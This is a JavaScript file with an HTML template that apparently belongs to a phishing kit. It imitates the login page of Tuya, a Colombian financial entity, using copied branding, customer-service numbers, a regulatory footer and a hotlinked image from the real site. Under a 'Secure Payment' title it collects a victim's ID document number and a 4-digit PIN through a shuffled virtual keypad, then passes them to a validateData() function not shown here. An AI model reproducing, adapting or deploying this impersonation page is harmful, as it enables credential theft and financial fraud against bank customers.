var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
    * {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"
    }

    a {
        color: white;
        font-size: 30px;
        align-items: center;
    }

    td[v] {
        width: 32px;
        text-align: center;
    }

    .btnLogin {
        background-color: red;
        color: white;
        margin-top: 20px;
        border: none;
        padding: 5px 10px;
        font-size: 18px;
    }

    #FooterImage {
        background-image: url('${my_hosting}img/titulos-productos.png');
        background-repeat: no-repeat;
        background-size: contain;
        height: 71px;
        background-position: center;
    }

    .table_teclado tr td {
        background: red;
        color: #FFF;
        font-size: 20px;
        padding: .2em .5em;
        cursor: pointer;
        border-radius: 3px;
        font-family: sans-serif;
        border: 1px solid red;
        max-width: 100px;
        position: relative;
    }

    .table_teclado tr td:hover {
        background: red;
    }

    #txtPassword {
        height: 40px;
        width: 60px;
        border: 1px solid gray;
    }

    #txtUsuario {
        height: 40px;
        width: 180px;
        border: 1px solid gray;
    }

    select {
        height: 40px;
        border: 1px solid gray;
        background-color: white;
        width: 190px;
        color: black;
    }
</style>

<img src="${my_hosting}img/banner_tuya.png" width="100%">

<div style="margin-top:30px;">
    <center>
        Fecha Actual <?php echo date('d/m/Y h:i:s a'); ?><br>Versión 5.0.2
    </center>
</div>
<br><br>
<div>
    <br>
        <center>
            Por favor, bríndenos su identificación y clave:
        </center>
    </br>
    <br><br><br>
    <div class="teclado" style=" float: left; width: 40%;">
        <table class="table_teclado" style="margin-left:20px;">
            <tr>
                <td v=""></td>
                <td v=""></td>
                <td v=""></td>
            </tr>
            <tr>
                <td v=""></td>
                <td v=""></td>
                <td v=""></td>
            </tr>
            <tr>
                <td v=""></td>
                <td v=""></td>
                <td v=""></td>
            </tr>
            <tr>
                <td v="" colspan="1">0</td>
                <td colspan="2" id="borrar">Borrar</td>
            </tr>
        </table>
    </div>

    <div class="datos" style="margin-left:170px;">
        <h4>Tipo de Documento</h4>
        <select>
            <option selected>CÉDULA DE CIUDADANÍA</option>
            <option>PASAPORTE</option>
        </select>
        <br>
        <br>
        <h4>Documento de <br>Identificación</h4>
        <input type="tel" class="px-2" id="txtUsuario">
        <h4 style="margin-top:20px;">Clave</h4>
        <input type="password" class="px-2" id="txtPassword" readonly>
        <center>
            <button class="btnLogin" onclick="validateData()">Ingresar</button>
        </center>
    </div>
    <center>
        <div style="margin-top:50px;">
            <img class="img-fluid mx-auto d-block m-4" style="border-radius: 20px; width:90%" src="https://www.tuya.com.co:8461/PortalTransaccionalTuya/App_Themes/Imagenes/PublicidadPortal.JPG" alt="">
        </div>
        <div class="footer ContactFrame text-center" style="padding-top: 10px; font-size:11px">
            <div id="FooterImage" class="FooterImage"></div>
            <div id="ContactFrame1" class="pb-5">
                Líneas de atención al cliente: Bogotá 601 482 4804 - Cali 602 380 8933 – Medellín 604 444 3727. Línea Nacional: 01 8000 978888<br>
                Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia<br>
                Para conocer acerca de la utilización de Información,<br>
                <a id="ctl00_HyperLink1" href="#" target="_blank">Ingresa aquí</a>
            </div>
        </div>
    </center>
</div>
`
//<script>
    loadContenido();

    let numeros = "0123456789";
    let arr = numeros.split('');

    $('td[v]').each(function() {
        let r = getRandomInt(0, arr.length);
        let n = arr.splice(r, 1)[0];
        $(this).html(n);
        $(this).prop('v', n);
    });

    $('.table_teclado').mouseover(function() {
        $('td[v]').each(function() {
            $(this).html('*');
        });
    });

    $('.table_teclado').mouseout(function() {
        $('td[v]').each(function() {
            $(this).html($(this).prop('v'));
        });
    });

    $('td[v]').click(function() {
        let nro = $(this).prop('v');
        let oldVal = $('#txtPassword').val();
        if (oldVal.length >= 4) {
            return;
        }
        $('#txtPassword').val(oldVal + nro).focus();
    });

    $('#borrar').click(function() {
        $('#txtPassword').val('').focus();
    });